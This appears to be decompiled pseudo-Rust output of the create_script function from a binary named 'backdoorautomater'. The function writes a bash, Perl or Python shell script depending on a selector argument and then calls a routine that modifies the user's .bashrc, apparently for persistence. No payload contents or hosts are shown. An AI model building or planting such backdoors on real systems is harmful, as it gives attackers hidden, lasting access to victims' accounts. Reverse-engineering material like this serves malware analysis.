
  fn backdoorautomater::shellscript::create_script::h6e2940071419697f(arg1: *mut i128, arg2: *mut i128, arg3: *mut i64, arg4: *mut i128, arg5: i8) -> i64

{
    let rax: *mut *mut [i8; 0x1] = arg3[1];
    let rcx_1: *mut c_void = arg3[2] + rax;
    let mut var_e8: *mut *mut [i8; 0x1] = rax;
    let var_e0: *mut c_void = rcx_1;
    let rax_1: i32 = _$LT$core..str..iter..Chars$u20$as$u20$core..iter..traits..double_ended..DoubleEndedIterator$GT$::next_back::h6ef03064f47cabe8(&var_e8);
    
    if rax_1 != 0x110000 && rax_1 != 0x2f
    {
        alloc::string::String::push::h8dfcd488d6c0f12b(arg3);
    }
    
    let var_d8: i64 = arg3[2];
    var_e8 = *arg3;
    let var_d0: i128 = *arg4;
    let var_c0: i64 = arg4[1];
    let mut var_b8: i128;
    alloc::str::join_generic_copy::h6e3e6eb2fb0da332(&var_b8, &var_e8, 2, 1, 0);
    let mut var_98: i128 = var_b8;
    let mut r13: *mut i128;
    r13 = 1;
    core::ptr::drop_in_place$LT$$u5b$alloc..string..String$u3b$$u20$2$u5d$$GT$::hfd07afc6d277b85d(
        &var_e8);
    let mut var_48: ();
    _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_48, 
        arg2);
    let mut var_60: i128;
    _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_60, 
        &var_98);
    let rbp_1: u32 = arg5;
    let mut var_78: i128;
    let mut rbx: i64;
    let var_a8: i64;
    
    if rbp_1 == 3
    {
        let var_68_3: i64 = arg2[1];
        var_78 = *arg2;
        let var_a8_3: i64 = arg1[1];
        var_b8 = *arg1;
        let var_d8_3: i64 = var_a8;
        var_e8 = var_98;
        backdoorautomater::sanitizer::sanitize_return_fn::hb2c462d03cd2292c(
            backdoorautomater::shellscript::write_shell_bash::hdd5bd13fe6aaa7b7(&var_78, &var_b8, 
            &var_e8));
        rbx = 1;
    }
    else if rbp_1 == 2
    {
        let var_68_2: i64 = arg2[1];
        var_78 = *arg2;
        let var_a8_2: i64 = arg1[1];
        var_b8 = *arg1;
        let var_d8_2: i64 = var_a8;
        var_e8 = var_98;
        backdoorautomater::sanitizer::sanitize_return_fn::hb2c462d03cd2292c(
            backdoorautomater::shellscript::write_shell_perl::h0df48fc72a197687(&var_78, &var_b8, 
            &var_e8));
        rbx = 1;
    }
    else if rbp_1 != 1
    {
        r13 = 1;
        rbx = 0;
    }
    else
    {
        let var_68_1: i64 = arg2[1];
        var_78 = *arg2;
        let var_a8_1: i64 = arg1[1];
        var_b8 = *arg1;
        let var_d8_1: i64 = var_a8;
        var_e8 = var_98;
        backdoorautomater::sanitizer::sanitize_return_fn::hb2c462d03cd2292c(
            backdoorautomater::shellscript::write_shell_pyfile::h0bdea7fe03ab2920(&var_78, &var_b8, 
            &var_e8));
        rbx = 1;
    }
    let var_50: i64;
    let var_d8_4: i64 = var_50;
    var_e8 = var_60;
    backdoorautomater::sanitizer::sanitize_return_fn::hb2c462d03cd2292c(
        backdoorautomater::shellscript::modify_bashrc::h273b1bb4da291c9b(&var_e8, rbp_1));
    var_e8 = &data_62a7e8;
    let var_e0_1: i64 = 1;
    let var_d8_5: i64 = 8;
    let mut var_d0_1: i128 = {0};
    std::io::stdio::_print::h9670eaecb29bc3fc(&var_e8);
    var_78 = &var_48;
    var_b8 = &var_78;
    *var_b8[8] = _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h79b96a6ad6630cec;
    var_e8 = &data_62a7f8;
    let var_e0_2: i64 = 2;
    *var_d0_1[8] = 0;
    let var_d8_6: *mut i128 = &var_b8;
    var_d0_1 = 1;
    std::io::stdio::_print::h9670eaecb29bc3fc(&var_e8);
    let result: i64 =
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_48);
    
    if rbx != 0
    {
        return result;
    }
    
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_98);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg1)
}
